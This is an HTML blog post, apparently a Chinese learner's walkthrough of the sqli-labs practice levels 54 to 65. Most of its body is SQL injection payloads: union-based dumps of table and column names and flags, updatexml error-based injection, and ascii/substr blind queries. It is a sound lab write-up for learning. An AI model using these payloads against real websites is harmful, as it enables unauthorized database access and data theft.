@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sqli-labs(less54-less65) | Altm4nz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="web" />
+  
+  
+  
+  
+  <meta name="description" content="从这部分开始题目看起来都比较有趣这部分题都是有查询次数限制的，读了下源码，他的数据库信息都是随机的，如果超过了次数限制，整个表都会随机重置。">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs(less54-less65)">
+<meta property="og:url" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;02&#x2F;10&#x2F;sqli-labs%204&#x2F;index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="从这部分开始题目看起来都比较有趣这部分题都是有查询次数限制的，读了下源码，他的数据库信息都是随机的，如果超过了次数限制，整个表都会随机重置。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-11-02T05:47:03.273Z">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/pokemon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
+            
+          </h1>
+          
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-sqli-labs 4" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      sqli-labs(less54-less65)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/02/10/sqli-labs%204/" class="article-date">
+	  <time datetime="2018-02-09T17:14:43.000Z" itemprop="datePublished">February 10, 2018</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>从这部分开始<br>题目看起来都比较有趣<br>这部分题都是有查询次数限制的，读了下源码，他的数据库信息都是随机的，如果超过了次数限制，整个表都会随机重置。</p>
+<a id="more"></a>
+<h3 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h3><p>尝试闭合 直接成功</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' or <span class="number">1</span>=<span class="number">1</span> %<span class="number">23</span></span><br><span class="line">?id=<span class="number">1</span>' order by <span class="number">3</span> %<span class="number">23</span></span><br><span class="line">?id=<span class="number">1</span>' order by <span class="number">4</span> %<span class="number">23</span> <span class="comment">//爆出字段</span></span><br><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,database() %<span class="number">23</span> <span class="comment">//爆出库名</span></span><br><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %<span class="number">23</span> <span class="comment">//爆表</span></span><br><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=<span class="number">0x6b6179736a6d316c6c6c</span>) %<span class="number">23</span> <span class="comment">//爆字段</span></span><br><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,(select group_concat(secret_IC58) from kaysjm1lll) %<span class="number">23</span> <span class="comment">//爆flag</span></span><br></pre></td></tr></table></figure>
+<p>一共用了7次 爆出flag：Qn53kV6NaD4ffFR1BSA3sBkp<br>（每次的数据库名表名字段名和flag都是不一样的）</p>
+<h3 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h3><p>和上面一样的套路，只是把单引号换成了括号<br>payload:</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>) <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h3><p>常规思路进行尝试 得到payload：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>') or  <span class="number">1</span>=<span class="number">1</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p>其他的就是常规暴库</p>
+<h3 id="less-57"><a href="#less-57" class="headerlink" title="less -57"></a>less -57</h3><p>一样的套路 只不过变成了双引号</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1" <span class="keyword">or</span> <span class="attribute">1</span>=1 %23</span><br></pre></td></tr></table></figure>
+
+<h3 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h3><p>单引号闭合 报错注入 </p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' or  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p>成功爆出库名。然后就是报错的常规操作了。</p>
+<h3 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h3><p>没有符号闭合的报错注入 :</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>  <span class="keyword">or</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1") <span class="keyword">or</span>  updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure>
+
+<h3 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>')) or  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h3><p>130次的限制，盲注 。<br>但是遇到了问题就是，盲注次数控制不了在130以内，这就很头疼。<br>payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>') and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))) &gt; <span class="number">97</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h3><p>只是换了闭合符号<br>payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))) &gt; <span class="number">97</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="less-64"><a href="#less-64" class="headerlink" title="less -64"></a>less -64</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>)) <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))) &gt; <span class="number">97</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="less-65"><a href="#less-65" class="headerlink" title="less -65"></a>less -65</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1") and (ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))) &gt; <span class="number">97</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>终于做完了65关 ，看着很多，其实做起来很快。本来以前后面会比较难，其实很基础，重复的题目太多了。<br>目前不懂得地方就是限制次数的盲注脚本。还没有想到什么好的办法，以后想到了会回来补上脚本的。OVER。</p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/02/24/SSTI/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SSTI（服务端模板注入攻击 ）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/02/09/sqli-labs%203/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sqli-labs (less39-less53)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#less-54"><span class="nav-number">1.</span> <span class="nav-text">less-54</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-55"><span class="nav-number">2.</span> <span class="nav-text">less-55</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-56"><span class="nav-number">3.</span> <span class="nav-text">less-56</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-57"><span class="nav-number">4.</span> <span class="nav-text">less -57</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-58"><span class="nav-number">5.</span> <span class="nav-text">less-58</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-59"><span class="nav-number">6.</span> <span class="nav-text">less-59</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-60"><span class="nav-number">7.</span> <span class="nav-text">less-60</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-61"><span class="nav-number">8.</span> <span class="nav-text">less-61</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-62"><span class="nav-number">9.</span> <span class="nav-text">less-62</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-63"><span class="nav-number">10.</span> <span class="nav-text">less-63</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-64"><span class="nav-number">11.</span> <span class="nav-text">less -64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-65"><span class="nav-number">12.</span> <span class="nav-text">less -65</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">13.</span> <span class="nav-text">总结</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/friend" class="mobile-nav-link">Friend</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 Altm4nz All Rights Reserved.
+        
+            <span id="busuanzi_container_site_uv">  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
